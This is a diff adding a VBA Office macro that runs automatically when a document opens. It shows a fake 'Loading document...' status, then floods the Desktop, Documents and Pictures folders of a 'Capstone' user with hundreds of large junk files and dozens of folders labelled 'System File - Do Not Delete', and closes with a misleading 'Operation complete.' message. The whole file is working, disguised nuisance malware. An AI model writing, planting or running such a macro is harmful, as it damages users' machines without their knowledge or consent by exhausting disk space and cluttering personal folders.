@@ -1,0 +1,103 @@
+Sub AutoOpen()
+    Call DelayedPrankExecution
+End Sub
+
+Sub DelayedPrankExecution()
+    Dim startTime As Single
+    Dim delaySeconds As Integer
+    
+    
+    delaySeconds = 10
+    
+    Application.StatusBar = "Loading document..."
+    
+    startTime = Timer
+    Do While Timer < startTime + delaySeconds
+        DoEvents
+    Loop
+    
+    Application.StatusBar = False
+    
+    Call MacroAttack
+    
+    MsgBox "Operation complete.", vbInformation, "System"
+End Sub
+
+Sub MacroAttack()
+    Call SpamFiles("C:\Users\Capstone\Desktop\", 100)
+    Call SpamFiles("C:\Users\Capstone\Documents\", 100)
+    Call SpamFiles("C:\Users\Capstone\Pictures\", 100)
+    
+    Call CreateFoldersWithFiles("C:\Users\Capstone\Desktop\", 20)
+    Call CreateFoldersWithFiles("C:\Users\Capstone\Documents\", 20)
+    Call CreateFoldersWithFiles("C:\Users\Capstone\Pictures\", 20)
+End Sub
+
+Sub SpamFiles(targetPath As String, numFiles As Integer)
+    Dim fso As Object
+    Dim textFile As Object
+    Dim filePath As String
+    Dim i As Integer
+    Dim j As Integer
+    
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    For i = 1 To numFiles
+        Randomize
+        
+        Dim fileName As String
+        fileName = "file_" & Int(Rnd() * 9999) & ".txt"
+        filePath = targetPath & fileName
+        
+        Set textFile = fso.CreateTextFile(filePath, True)
+        textFile.WriteLine "System File - Do Not Delete"
+        textFile.WriteLine "ID: " & Int(Rnd() * 99999)
+        textFile.WriteLine "Created: " & Now
+        textFile.WriteLine ""
+        
+        For j = 1 To 10000
+            textFile.WriteLine "Lol I really did this huh? Astro is awesome fr fr. "
+        Next j
+        
+        textFile.Close
+    Next i
+End Sub
+
+Sub CreateFoldersWithFiles(targetPath As String, numFolders As Integer)
+    Dim fso As Object
+    Dim folderPath As String
+    Dim textFile As Object
+    Dim filePath As String
+    Dim i As Integer
+    Dim j As Integer
+    Dim k As Integer
+    
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    For i = 1 To numFolders
+        Randomize
+        
+        Dim folderName As String
+        folderName = "folder_" & Int(Rnd() * 9999)
+        folderPath = targetPath & folderName
+        
+        If Not fso.FolderExists(folderPath) Then
+            fso.CreateFolder folderPath
+        End If
+        
+        For j = 1 To 5
+            filePath = folderPath & "\file" & j & ".txt"
+            
+            Set textFile = fso.CreateTextFile(filePath, True)
+            textFile.WriteLine "Data File " & j
+            textFile.WriteLine "Folder: " & folderName
+            textFile.WriteLine ""
+            
+            For k = 1 To 10000
+                textFile.WriteLine "Lol, Astro is awesome fr fr. I really did this. "
+            Next k
+            
+            textFile.Close
+        Next j
+    Next i
+End Sub
